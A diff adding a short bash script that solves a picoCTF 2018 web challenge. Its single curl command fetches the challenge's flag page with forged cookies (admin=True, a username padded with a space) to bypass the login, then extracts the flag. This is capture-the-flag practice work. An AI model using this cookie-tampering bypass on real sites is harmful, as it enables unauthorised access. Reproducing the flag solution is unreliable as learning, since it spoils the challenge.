@@ -1,0 +1,3 @@
+#!/bin/bash
+curl -s 'http://2018shell.picoctf.com:5477/flag' -H 'Connection: keep-alive' -H 'Cache-Control: max-age=0' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Referer: http://2018shell.picoctf.com:5477/login' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en-US,en;q=0.9' -H 'Cookie: _ga=GA1.2.1705455328.1547898484; _gid=GA1.2.632866759.1552481259; admin=True; password=password; username="admin "' --compressed | grep -oE 'picoCTF{.*}' --color=none
+
